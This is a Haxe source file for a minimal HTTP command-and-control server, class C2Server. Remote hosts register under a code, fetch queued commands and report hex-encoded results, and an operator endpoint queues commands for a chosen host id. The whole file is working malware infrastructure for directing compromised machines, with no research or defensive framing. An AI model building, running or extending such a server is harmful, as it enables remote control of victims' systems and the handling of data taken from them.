import tink.http.containers.*;
import tink.http.Response;
import tink.Url;
import tink.url.Query;
using tink.CoreApi;
using haxe.io.Bytes;

class C2Server {
    static var codes_tables:Map<String, String> = [];
    static var command_tables:Map<String, Array<String>> = [];
    static var return_tables:Map<String, Array<String>> = [];

    static function main() {
        var container = new NodeContainer(8000);
        container.run(function(req) {
            var url:Url = req.header.url;
            Sys.println("req: " + url.path);
            if (req.header.url.path == "/status") {
                return Future.sync((C2Server.statusPath(req):OutgoingResponse));
            } else if (req.header.url.path == "/asdf") {
                return Future.sync((C2Server.asdfPath(req):OutgoingResponse));
            } else if (req.header.url.path == "/qwerty") {
                return Future.sync((C2Server.qwertyPath(req):OutgoingResponse));
            } else if (req.header.url.path == "/zxcv") {
                return Future.sync((C2Server.zxcvPath(req):OutgoingResponse));
            } else if (req.header.url.path == "/comstar") {
                return Future.sync((C2Server.comstarPath(req):OutgoingResponse));
            } else {
                return Future.sync(('Hello, World!':OutgoingResponse));
            }
        });
    }

    static function statusPath(req) {
        return 'status:
    code_tables: ${C2Server.codes_tables}
    command_tables: ${C2Server.command_tables}
    return_tables: ${C2Server.return_tables}\n';
    }

    static function asdfPath(req) {
        var url:Url = req.header.url;
        var q = url.query.toMap();
        var code = q['code'];
        var ret = q['ret'];

        if (!C2Server.command_tables.exists(code)) {
            var n = [ for (k in C2Server.codes_tables.keys()) k ].length;
            var id = 'z-${n}';
            C2Server.codes_tables[id] = code;
            C2Server.command_tables[code] = [];
            C2Server.return_tables[code] = [];
            Sys.println('added child host: ${code} => ${C2Server.codes_tables[id]}');
        }

        if (ret != null && ret != "") {
            var ret_list:String = ret;
            var parsed_list = ret_list.split(',');
            var parsed_list2 = parsed_list.map(s -> Bytes.ofHex(s).toString());
            for (ret_s in parsed_list2) {
                C2Server.return_tables[code].push(ret_s);
            }
        }

        return C2Server.zxcvPath(req);
    }

    static function zxcvPath(req) {
        var url:Url = req.header.url;
        var q = url.query.toMap();
        var code = q['code'];

        if (!C2Server.command_tables.exists(code)) {
            return 'code doesnt exists!';
        }

        var coms = C2Server.command_tables[code];
        C2Server.command_tables[code] = [];
        return 'coms: [${coms.join(",")}]';
    }

    static function comstarPath(req) {
        var url:Url = req.header.url;
        var q = url.query.toMap();
        var id = q['id'];
        var com = q['com'];

        if (!C2Server.codes_tables.exists(id)) {
            return 'id doesnt exist';
        }

        C2Server.command_tables[C2Server.codes_tables[id]].push(com);
        return 'batched coms: ${C2Server.command_tables[C2Server.codes_tables[id]]}';
    }

    static function qwertyPath(req) {
        var url:Url = req.header.url;
        var query = url.query;
        if (query != null) {
            var nquery:Query = query;
            var values = nquery.toMap();
            Sys.println("thing: " + values['key']);
        }
        return 'qwerty:';
    }
}




